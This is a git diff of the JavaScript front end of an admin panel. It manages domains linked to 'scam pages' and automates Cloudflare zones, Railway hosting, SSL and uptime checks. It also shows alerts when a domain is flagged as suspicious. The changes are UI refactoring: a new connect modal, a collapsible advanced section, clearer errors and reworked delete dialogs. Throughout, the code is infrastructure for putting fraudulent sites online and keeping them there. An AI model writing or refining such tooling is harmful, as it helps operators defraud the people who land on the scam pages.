@@ -263,12 +263,18 @@ const DomainsPage = (() => {
 .dm-audit-error { color: #f87171; font-size: 10.5px; margin-top: 2px; }
 
 /* Override select */
-.dm-override-row { display: flex; gap: 8px; margin-top: 10px; }
+.dm-override-row { display: flex; gap: 8px; margin-top: 0; }
 .dm-override-sel {
   flex: 1; padding: 8px 10px; background: rgba(255,255,255,.05);
   border: 1px solid rgba(255,255,255,.1); border-radius: 8px;
   color: #f1f5f9; font-size: 12px; font-family: 'Inter', sans-serif;
 }
+
+/* Details/summary advanced toggle */
+details summary::-webkit-details-marker { display: none; }
+details summary::marker { display: none; }
+details[open] summary svg { transform: rotate(180deg); }
+details summary svg { transition: transform .2s; }
 </style>`;
   }
 
@@ -523,22 +529,18 @@ const DomainsPage = (() => {
 
   function openConnectModal() {
     const content = `
-<div style="background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.2);border-radius:10px;padding:12px 14px;margin-bottom:14px;">
-  <div style="font-size:11px;font-weight:700;color:#fbbf24;letter-spacing:.06em;margin-bottom:8px;">HOW IT WORKS</div>
-  <div style="font-size:12px;color:#cbd5e1;line-height:1.8;">
-    <span style="color:#fbbf24;font-weight:600;">1.</span> Enter your domain and pick which scam page it opens<br>
-    <span style="color:#fbbf24;font-weight:600;">2.</span> Click <strong>Create Zone</strong> — copy the nameservers shown and update them at your registrar<br>
-    <span style="color:#fbbf24;font-weight:600;">3.</span> Done — Railway + SSL happen automatically. Once live, the domain serves the selected page.
-  </div>
+<div style="font-size:12px;color:#94a3b8;margin-bottom:14px;line-height:1.6;">
+  Pick a scam page, enter a domain, then point your registrar's nameservers to Cloudflare.
 </div>
+<label style="display:block;font-size:11px;font-weight:600;color:#94a3b8;letter-spacing:.05em;margin-bottom:6px;">LINK TO SCAM PAGE <span style="font-weight:400;color:#64748b;">(opens when domain is live)</span></label>
+<div id="dm-new-website-container" style="margin-bottom:14px;"></div>
 <label style="display:block;font-size:11px;font-weight:600;color:#94a3b8;letter-spacing:.05em;margin-bottom:6px;">DOMAIN NAME</label>
 <input type="text" id="dm-new-domain" placeholder="example.com"
   style="width:100%;padding:10px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
-  border-radius:9px;color:#f1f5f9;font-size:13px;font-family:monospace;box-sizing:border-box;margin-bottom:12px;"
+  border-radius:9px;color:#f1f5f9;font-size:13px;font-family:monospace;box-sizing:border-box;"
   autocomplete="off" spellcheck="false"/>
-<div style="font-size:11px;color:#64748b;margin-bottom:12px;">Enter the root domain only — no www, no https://</div>
-<label style="display:block;font-size:11px;font-weight:600;color:#94a3b8;letter-spacing:.05em;margin-bottom:6px;">LINK TO SCAM PAGE <span style="font-weight:400;color:#64748b;">(opens when domain is live)</span></label>
-<div id="dm-new-website-container" style="margin-bottom:4px;"></div>
+<div style="font-size:11px;color:#64748b;margin-top:6px;">Root domain only — no www, no https://</div>
+<div id="dm-connect-error" style="display:none;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.25);border-radius:8px;padding:8px 12px;margin-top:10px;font-size:12px;color:#f87171;line-height:1.5;"></div>
 <div id="dm-ns-result" style="display:none;margin-top:14px;"></div>`;
 
     let zoneCreated = false;
@@ -574,13 +576,16 @@ const DomainsPage = (() => {
           if (nsBox && ns.length) {
             nsBox.style.display = 'block';
             nsBox.innerHTML = `
-<div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:8px;padding:10px 12px;margin-bottom:10px;">
-  <div style="font-size:11px;font-weight:700;color:#f87171;letter-spacing:.06em;margin-bottom:4px;">ACTION REQUIRED</div>
-  <div style="font-size:12px;color:#fca5a5;line-height:1.6;">Go to your registrar → Domain → Nameservers → select <strong>Custom DNS</strong> and set these:</div>
-</div>
-${nsBox_html(ns)}
-<div style="font-size:11px;color:#64748b;margin-top:8px;line-height:1.6;">
-  After updating, click <strong style="color:#f1f5f9;">Done</strong> to close. The pipeline advances automatically — check back in 30–60 minutes.
+<div style="padding-top:14px;border-top:1px solid rgba(255,255,255,.07);">
+  <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+    <div style="width:28px;height:28px;border-radius:50%;background:rgba(16,185,129,.15);color:#6ee7b7;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:700;">✓</div>
+    <div>
+      <div style="font-size:13px;font-weight:700;color:#f1f5f9;margin-bottom:1px;">Zone created</div>
+      <div style="font-size:11.5px;color:#94a3b8;">Set these nameservers at your registrar:</div>
+    </div>
+  </div>
+  ${nsBox_html(ns)}
+  <div style="font-size:11px;color:#64748b;margin-top:8px;line-height:1.6;">Pipeline updates automatically. Click <strong style="color:#f1f5f9;">Done</strong> when you've updated your registrar.</div>
 </div>`;
             wireNsCopy(nsBox);
           }
@@ -600,14 +605,28 @@ ${nsBox_html(ns)}
           throw new Error('keep-modal');
         } catch (err) {
           if (err.message === 'keep-modal') throw err;
-          window.showToast(err.message, 'error');
+          const errDiv = document.getElementById('dm-connect-error');
+          if (errDiv) {
+            const msg = /zone\.create|permission/i.test(err.message)
+              ? 'Cloudflare API token is missing zone-creation permission. Add Zone:Edit to your token in the Cloudflare dashboard.'
+              : err.message;
+            errDiv.textContent = msg;
+            errDiv.style.display = 'block';
+          } else {
+            window.showToast(err.message, 'error');
+          }
           throw err;
         }
       },
     });
 
     setTimeout(() => {
-      document.getElementById('dm-new-domain')?.focus();
+      const domainInput = document.getElementById('dm-new-domain');
+      domainInput?.focus();
+      domainInput?.addEventListener('input', () => {
+        const errDiv = document.getElementById('dm-connect-error');
+        if (errDiv) errDiv.style.display = 'none';
+      });
       if (window.ALPWebsiteSelect) {
         window.ALPWebsiteSelect.create({
           containerId:   'dm-new-website-container',
@@ -663,126 +682,123 @@ ${nsBox_html(ns)}
     const domain = _domains.find(d => String(d.id) === String(id));
     if (!domain) return;
 
-    let logsHtml = '<div style="color:var(--text-tertiary);font-size:12px;">Loading…</div>';
-    const meta   = STATUS_META[domain.status] || STATUS_META.error;
-    const ns     = parseNs(domain);
-    const dns    = parseDns(domain);
-
-    const nsSection = ns.length ? `
-<div class="dm-detail-section">
-  <div class="dm-detail-lbl">Nameservers (set at your registrar)</div>
-  ${nsBox_html(ns)}
-</div>` : '';
-
-    const dnsSection = dns.length ? `
-<div class="dm-detail-section">
-  <div class="dm-detail-lbl">DNS Records created in Cloudflare</div>
-  ${dns.map(r => `
-  <div class="dm-kv">
-    <span class="dm-kv-k">${esc(r.type)} ${esc(r.name)}</span>
-    <span class="dm-kv-v">${esc(r.content)}</span>
-  </div>`).join('')}
-</div>` : '';
-
-    const linkedPage = _scamPages.find(w => String(w.id) === String(domain.website_id));
-
-    const scamPageSection = `
-<div class="dm-detail-section">
-  <div class="dm-detail-lbl">Linked Scam Page</div>
-  ${linkedPage
-    ? `<div class="dm-kv" style="margin-bottom:10px;">
-        <span class="dm-kv-k">Currently linked</span>
-        <span class="dm-kv-v" style="color:#10b981;font-weight:600;">✓ ${esc(linkedPage.name)}${linkedPage.demo_slug ? ' <span style="color:#64748b;font-weight:400;">(/'+esc(linkedPage.demo_slug)+')</span>' : ''}${linkedPage.is_active === 0 ? ' <span style="font-size:9px;padding:1px 5px;border-radius:4px;background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.25);">INACTIVE</span>' : ''}</span>
-       </div>`
-    : `<div style="font-size:12px;color:#f59e0b;margin-bottom:10px;">⚠ No scam page linked — domain will show a 404 when live.</div>`}
-  <div id="dm-website-sel-container" style="margin-bottom:8px;"></div>
-  <button class="dm-btn secondary" id="dm-save-website-btn" style="padding:7px 12px;white-space:nowrap;width:100%;">Save Link</button>
-</div>`;
-
-    const overrideSection = `
-<div class="dm-detail-section">
-  <div class="dm-detail-lbl">Manual Override</div>
-  <div style="font-size:11.5px;color:var(--text-secondary);margin-bottom:10px;">
-    Force-advance the pipeline to a specific stage (use when automating isn't possible).
-  </div>
-
-  <div style="margin-bottom:10px;">
-    <label style="display:block;font-size:10.5px;font-weight:700;color:#94a3b8;letter-spacing:.05em;margin-bottom:5px;">LINK RAILWAY DOMAIN ID <span style="font-weight:400;color:#64748b;">(paste after adding domain manually in Railway dashboard)</span></label>
-    <div style="display:flex;gap:8px;">
-      <input id="dm-railway-id-input" type="text" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
-        value="${esc(domain.railway_domain_id || '')}"
-        style="flex:1;padding:7px 10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#f1f5f9;font-size:12px;font-family:monospace;"/>
-      <button class="dm-btn secondary" id="dm-save-rwid-btn" style="padding:7px 12px;white-space:nowrap;">Save ID</button>
-    </div>
-  </div>
-
-  <div class="dm-override-row">
-    <select class="dm-override-sel" id="dm-override-sel">
-      <option value="">— select status —</option>
-      <option value="pending_nameservers">pending_nameservers</option>
-      <option value="nameservers_active">nameservers_active</option>
-      <option value="railway_linked">railway_linked</option>
-      <option value="ssl_issued">ssl_issued</option>
-      <option value="live">live</option>
-      <option value="error">error</option>
-    </select>
-    <button class="dm-btn secondary" id="dm-override-btn" style="padding:7px 12px;">Apply</button>
-  </div>
-</div>`;
-
+    const meta        = STATUS_META[domain.status] || STATUS_META.error;
+    const ns          = parseNs(domain);
+    const dns         = parseDns(domain);
+    const linkedPage  = _scamPages.find(w => String(w.id) === String(domain.website_id));
     const isLiveOrSsl = domain.status === 'live' || domain.status === 'ssl_issued';
-    const quickLinks = `
-<div class="dm-quick-links">
-  ${isLiveOrSsl ? `<a class="dm-qlink green" href="https://${esc(domain.domain)}" target="_blank" rel="noopener">↗ Visit Site</a>` : ''}
-  ${domain.cf_zone_id ? `<a class="dm-qlink orange" href="https://dash.cloudflare.com/zones/${esc(domain.cf_zone_id)}" target="_blank" rel="noopener">☁ Cloudflare</a>` : ''}
-  <a class="dm-qlink blue" href="https://railway.app" target="_blank" rel="noopener">🚂 Railway</a>
-</div>`;
-
-    const flagSection = domain.flagged ? `
-<div class="dm-detail-section" style="border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.06);">
-  <div class="dm-detail-lbl" style="color:#f87171;">⚠ Domain Flagged</div>
-  <div class="dm-kv"><span class="dm-kv-k">Detected</span><span class="dm-kv-v" style="color:#f87171;">${esc(domain.flag_reason || 'Suspicious content')}</span></div>
-  <div class="dm-kv"><span class="dm-kv-k">Flagged at</span><span class="dm-kv-v">${fmtTime(domain.flag_detected_at)}</span></div>
-</div>` : '';
 
     const content = `
 <div>
-  ${quickLinks}
-  ${flagSection}
-  ${scamPageSection}
-  <!-- Status summary -->
-  <div class="dm-detail-section">
-    <div class="dm-detail-lbl">Status</div>
-    <div class="dm-kv">
-      <span class="dm-kv-k">Current status</span>
-      <span class="dm-kv-v" style="color:${meta.color};font-family:sans-serif;font-weight:700;">${meta.icon} ${meta.label}</span>
+
+  <!-- Header banner -->
+  <div style="background:linear-gradient(135deg,rgba(99,102,241,.07) 0%,rgba(16,185,129,.04) 100%);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px 18px;margin-bottom:14px;">
+    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
+      ${domain.uptime_ok === 1 ? '<span class="dm-uptime-dot up" style="font-size:10px;">Up</span>' : domain.uptime_ok === 0 ? '<span class="dm-uptime-dot down" style="font-size:10px;">Down</span>' : ''}
+      <span style="font-family:monospace;font-size:15px;font-weight:700;color:#f1f5f9;flex:1;min-width:0;word-break:break-all;">${esc(domain.domain)}</span>
+      <span class="dm-status-badge" style="background:${meta.color}1a;color:${meta.color};border:1px solid ${meta.color}33;flex-shrink:0;">${meta.icon} ${meta.label}</span>
     </div>
-    <div class="dm-kv">
-      <span class="dm-kv-k">Last checked</span>
-      <span class="dm-kv-v">${fmtTime(domain.last_checked_at)}</span>
+    <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
+      ${isLiveOrSsl ? `<a class="dm-qlink green" href="https://${esc(domain.domain)}" target="_blank" rel="noopener" style="padding:5px 10px;font-size:11px;">↗ Visit</a>` : ''}
+      ${domain.cf_zone_id ? `<a class="dm-qlink orange" href="https://dash.cloudflare.com/zones/${esc(domain.cf_zone_id)}" target="_blank" rel="noopener" style="padding:5px 10px;font-size:11px;">☁ CF</a>` : ''}
+      <a class="dm-qlink blue" href="https://railway.app" target="_blank" rel="noopener" style="padding:5px 10px;font-size:11px;">🚂 Railway</a>
+      <span style="margin-left:auto;font-size:10.5px;color:#475569;">${esc(domain.dns_provider)} · ${esc(domain.hosting_provider)} · ${fmtAgo(domain.last_checked_at)}</span>
     </div>
-    <div class="dm-kv">
-      <span class="dm-kv-k">DNS provider</span>
-      <span class="dm-kv-v">${esc(domain.dns_provider)}</span>
-    </div>
-    <div class="dm-kv">
-      <span class="dm-kv-k">Hosting provider</span>
-      <span class="dm-kv-v">${esc(domain.hosting_provider)}</span>
-    </div>
-    ${domain.cf_zone_id ? `<div class="dm-kv"><span class="dm-kv-k">CF Zone ID</span><span class="dm-kv-v">${esc(domain.cf_zone_id)}</span></div>` : ''}
-    ${domain.railway_domain_id ? `<div class="dm-kv"><span class="dm-kv-k">Railway Domain ID</span><span class="dm-kv-v">${esc(domain.railway_domain_id)}</span></div>` : ''}
-    ${domain.error_message ? `<div class="dm-kv"><span class="dm-kv-k">Error</span><span class="dm-kv-v" style="color:#f87171;">${esc(domain.error_message)}</span></div>` : ''}
-    ${domain.uptime_ok !== null ? `<div class="dm-kv"><span class="dm-kv-k">Last uptime check</span><span class="dm-kv-v" style="color:${domain.uptime_ok ? '#6ee7b7' : '#f87171'}">${domain.uptime_ok ? 'Up ✓' : 'Down ✕'} · ${fmtTime(domain.last_uptime_check_at)}</span></div>` : ''}
-    ${domain.manual_override ? `<div class="dm-kv"><span class="dm-kv-k">Manual override</span><span class="dm-kv-v" style="color:#fbbf24;">Yes${domain.manual_override_note ? ' — ' + esc(domain.manual_override_note) : ''}</span></div>` : ''}
   </div>
-  ${nsSection}
-  ${dnsSection}
-  ${overrideSection}
+
+  ${domain.flagged ? `
+  <div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:10px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:flex-start;gap:10px;">
+    <span style="font-size:16px;flex-shrink:0;">⚠</span>
+    <div>
+      <div style="font-size:12px;font-weight:700;color:#f87171;margin-bottom:2px;">Domain Flagged</div>
+      <div style="font-size:11px;color:#fca5a5;line-height:1.5;">${esc(domain.flag_reason || 'Suspicious content')} · ${fmtTime(domain.flag_detected_at)}</div>
+    </div>
+  </div>` : ''}
+
+  <!-- Linked scam page -->
+  <div style="background:${linkedPage ? 'rgba(16,185,129,.06)' : 'rgba(245,158,11,.06)'};border:1px solid ${linkedPage ? 'rgba(16,185,129,.2)' : 'rgba(245,158,11,.2)'};border-radius:12px;padding:14px 16px;margin-bottom:14px;">
+    <div style="font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:${linkedPage ? '#6ee7b7' : '#fbbf24'};margin-bottom:8px;">
+      ${linkedPage
+        ? `✓ Serving — ${esc(linkedPage.name)}${linkedPage.demo_slug ? ' <span style="font-weight:400;color:#64748b;">/ ' + esc(linkedPage.demo_slug) + '</span>' : ''}${linkedPage.is_active === 0 ? ' <span style="font-size:9px;padding:1px 5px;border-radius:4px;background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.25);font-weight:700;">INACTIVE</span>' : ''}`
+        : '⚠ No page linked — will 404 when live'}
+    </div>
+    <div id="dm-website-sel-container" style="margin-bottom:8px;"></div>
+    <button class="dm-btn secondary" id="dm-save-website-btn" style="width:100%;justify-content:center;padding:7px 12px;">Update Link</button>
+  </div>
+
+  <!-- Pipeline -->
+  <div style="margin-bottom:14px;">${renderPipeline(domain)}</div>
+
+  ${ns.length ? `
+  <div style="margin-bottom:14px;">
+    <div style="font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;">Nameservers — set at your registrar</div>
+    ${nsBox_html(ns)}
+  </div>` : ''}
+
+  ${domain.error_message ? `
+  <div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:12px;color:#f87171;line-height:1.5;">
+    <strong>Error:</strong> ${esc(domain.error_message)}
+  </div>` : ''}
+
+  <!-- Advanced collapsible -->
+  <details style="margin-bottom:14px;">
+    <summary style="cursor:pointer;list-style:none;display:flex;align-items:center;gap:6px;padding:9px 0;border-top:1px solid rgba(255,255,255,.06);font-size:10.5px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;user-select:none;">
+      ⚙ Advanced
+      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+    </summary>
+    <div style="padding-top:12px;">
+
+      ${dns.length ? `
+      <div style="margin-bottom:12px;">
+        <div style="font-size:10px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;">DNS Records</div>
+        <div style="background:rgba(0,0,0,.2);border-radius:8px;padding:8px 12px;">
+          ${dns.map(r => `<div class="dm-kv"><span class="dm-kv-k">${esc(r.type)} ${esc(r.name)}</span><span class="dm-kv-v">${esc(r.content)}</span></div>`).join('')}
+        </div>
+      </div>` : ''}
+
+      ${(domain.cf_zone_id || domain.railway_domain_id || domain.manual_override || domain.uptime_ok !== null) ? `
+      <div style="background:rgba(0,0,0,.15);border-radius:8px;padding:8px 12px;margin-bottom:12px;">
+        ${domain.cf_zone_id ? `<div class="dm-kv"><span class="dm-kv-k">CF Zone ID</span><span class="dm-kv-v">${esc(domain.cf_zone_id)}</span></div>` : ''}
+        ${domain.railway_domain_id ? `<div class="dm-kv"><span class="dm-kv-k">Railway ID</span><span class="dm-kv-v">${esc(domain.railway_domain_id)}</span></div>` : ''}
+        ${domain.manual_override ? `<div class="dm-kv"><span class="dm-kv-k">Manual override</span><span class="dm-kv-v" style="color:#fbbf24;">${esc(domain.manual_override_note || 'Yes')}</span></div>` : ''}
+        ${domain.uptime_ok !== null ? `<div class="dm-kv"><span class="dm-kv-k">Last uptime</span><span class="dm-kv-v" style="color:${domain.uptime_ok ? '#6ee7b7' : '#f87171'}">${domain.uptime_ok ? '↑ Up' : '↓ Down'} · ${fmtTime(domain.last_uptime_check_at)}</span></div>` : ''}
+      </div>` : ''}
+
+      <div style="margin-bottom:12px;">
+        <label style="font-size:10px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;display:block;">Railway Domain ID</label>
+        <div style="display:flex;gap:8px;">
+          <input id="dm-railway-id-input" type="text" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+            value="${esc(domain.railway_domain_id || '')}"
+            style="flex:1;padding:8px 10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#f1f5f9;font-size:11.5px;font-family:monospace;"/>
+          <button class="dm-btn secondary" id="dm-save-rwid-btn" style="padding:7px 12px;white-space:nowrap;">Save</button>
+        </div>
+      </div>
+
+      <div>
+        <label style="font-size:10px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;display:block;">Force Pipeline Stage</label>
+        <div class="dm-override-row">
+          <select class="dm-override-sel" id="dm-override-sel">
+            <option value="">— select —</option>
+            <option value="pending_nameservers">pending_nameservers</option>
+            <option value="nameservers_active">nameservers_active</option>
+            <option value="railway_linked">railway_linked</option>
+            <option value="ssl_issued">ssl_issued</option>
+            <option value="live">live</option>
+            <option value="error">error</option>
+          </select>
+          <button class="dm-btn secondary" id="dm-override-btn" style="padding:7px 12px;">Apply</button>
+        </div>
+      </div>
+
+    </div>
+  </details>
+
   <!-- Audit log -->
-  <div class="dm-detail-section">
-    <div class="dm-detail-lbl">Audit Log</div>
-    <div id="dm-audit-list">${logsHtml}</div>
+  <div>
+    <div style="font-size:10px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Activity</div>
+    <div id="dm-audit-list"><div style="font-size:12px;color:var(--text-tertiary);">Loading…</div></div>
   </div>
+
 </div>`;
 
     window.showModal({
@@ -905,13 +921,16 @@ ${nsBox_html(ns)}
     window.showModal({
       title: 'Delete Domain',
       type:  'danger',
-      content: `<p style="margin:0;color:var(--text-secondary);font-size:13px;line-height:1.6;">
-        Delete <strong style="color:#f1f5f9;">${esc(d.domain)}</strong>?<br>
-        <span style="font-size:11.5px;color:var(--text-muted);">
-          This will also delete the Cloudflare zone and Railway domain attachment.
-          This action cannot be undone.
-        </span></p>`,
-      confirmText: 'Delete Everything',
+      content: `
+<div style="text-align:center;padding:6px 0 2px;">
+  <div style="width:44px;height:44px;border-radius:50%;background:rgba(239,68,68,.12);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:20px;">🗑</div>
+  <div style="font-family:monospace;font-size:14px;font-weight:700;color:#f1f5f9;margin-bottom:8px;">${esc(d.domain)}</div>
+  <div style="font-size:12px;color:#94a3b8;line-height:1.7;">
+    Removes Cloudflare zone, Railway attachment, and panel record.<br>
+    <span style="color:#64748b;">Cannot be undone.</span>
+  </div>
+</div>`,
+      confirmText: 'Delete',
       onConfirm: async () => {
         try {
           const res = await window.ALPApi.deleteManagedDomain(id);
@@ -934,9 +953,7 @@ ${nsBox_html(ns)}
     window.showModal({
       title: 'Bulk Import Domains',
       content: `
-<div style="font-size:12.5px;color:var(--text-secondary);margin-bottom:12px;line-height:1.6;">
-  Enter one domain per line (max 50). Each will have a Cloudflare zone created automatically.
-</div>
+<div style="font-size:12px;color:#94a3b8;margin-bottom:12px;">One domain per line, max 50. A Cloudflare zone is created for each.</div>
 <textarea id="dm-import-ta" placeholder="example.com&#10;another.io&#10;mysite.net"
   style="width:100%;height:140px;padding:10px 12px;background:rgba(255,255,255,.05);
   border:1px solid rgba(255,255,255,.1);border-radius:9px;color:#f1f5f9;
@@ -1118,9 +1135,12 @@ ${nsBox_html(ns)}
   async function _deleteLegacyRailway(railwayDomainId, domainName) {
     window.showModal({
       title: 'Remove from Railway',
-      message: `Remove <strong>${domainName}</strong> from Railway? The domain record in your website settings will stay — only the Railway custom domain attachment is deleted.`,
+      content: `<div style="font-size:13px;color:var(--text-secondary);line-height:1.7;">
+        Remove <strong style="color:#f1f5f9;font-family:monospace;">${esc(domainName)}</strong> from Railway?<br>
+        <span style="font-size:11.5px;color:#64748b;">Website settings stay unchanged — only the Railway domain attachment is deleted.</span>
+      </div>`,
       confirmText: 'Remove',
-      confirmClass: 'btn-danger',
+      type: 'danger',
       onConfirm: async () => {
         try {
           await window.ALPApi.removeRailwayDomain(railwayDomainId);
